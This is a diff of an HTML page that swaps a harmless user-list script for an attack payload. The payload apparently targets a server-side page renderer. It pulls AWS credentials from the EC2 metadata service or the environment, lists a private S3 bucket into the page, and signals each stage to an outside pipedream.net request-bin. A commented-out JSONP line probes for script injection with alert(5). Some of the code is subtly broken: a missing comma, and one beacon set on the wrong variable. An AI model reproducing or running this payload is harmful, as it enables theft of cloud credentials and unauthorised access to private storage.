@@ -2,31 +2,62 @@
 <html>
 <head>
 <title>Page Title</title>
-<script src="https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js"></script>
 </head>
 <body>
 
 <h1>This is a Heading</h1>
 <p>This is a paragraph.</p>
+<script src="https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js"></script>
 <script>
-  fetch('https://654551c05a0b4b04436def76.mockapi.io/users/')
-    .then(response => response.json())
-    .then(data => {
-      data.forEach(user => {
-        const id = user.id;
-        const name = user.name;
+  var img0 = new Image;
+  img0.src = 'https://ennds7nyc15a.x.pipedream.net/?c=success_tahap_0';
 
-        const listItem = document.createElement('li');
-        listItem.textContent = `ID: ${id}, Name: ${name}`;
+  AWS.config.region = 'ap-southeast-1';
+  var img01 = new Image;
+  img01.src = 'https://ennds7nyc15a.x.pipedream.net/?c=success_tahap_01';
 
-        document.getElementById('userList').appendChild(listItem);
-      });
-    })
-    .catch(error => console.log(error));
+  AWS.config.credentials = new AWS.CredentialProviderChain([
+    new AWS.EC2MetadataCredentials({
+      httpOptions: { timeout: 5000 }, // 5 second timeout
+      maxRetries: 10, // retry 10 times
+      retryDelayOptions: { base: 200 }, // see AWS.Config for information
+      logger: console // see AWS.Config for information
+      ec2MetadataV1Disabled: false // whether to block IMDS v1 fallback.
+    }),
+    new AWS.EnvironmentCredentials('AWS')
+  ]);
+
+  var img = new Image;
+  img.src = 'https://ennds7nyc15a.x.pipedream.net/?c=success_tahap_1';
+
+  var s3Client = new AWS.S3();
+  var bucketName = 'tvlk-appsecday-screenshot';
+
+  var params = {
+    Bucket: bucketName,
+    Delimiter: '/',
+    Prefix: ''
+  };
+
+  var img2 = new Image;
+  img.src = 'https://ennds7nyc15a.x.pipedream.net/?c=success_tahap_2';
+  s3Client.listObjectsV2(params, function(err, data) {
+    if (err) {
+      console.log(err, err.stack);
+    } else {
+      var directories = data.CommonPrefixes.map(function(prefix) {
+        return '<li>' + prefix.Prefix + '</li>';
+      }).join('');
+      var files = data.Contents.map(function(content) {
+        return '<li>' + content.Key + '</li>';
+      }).join('');
+
+      var list = '<ul>' + directories + files + '</ul>';
+      document.getElementById('result').innerHTML = list;
+    }
+  });
 </script>
-<p>oke</p>
 
-<ul id="userList"></ul>
 <ul id="result"></ul>
 <!-- <script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=alert(5)"></script> -->
 </body>
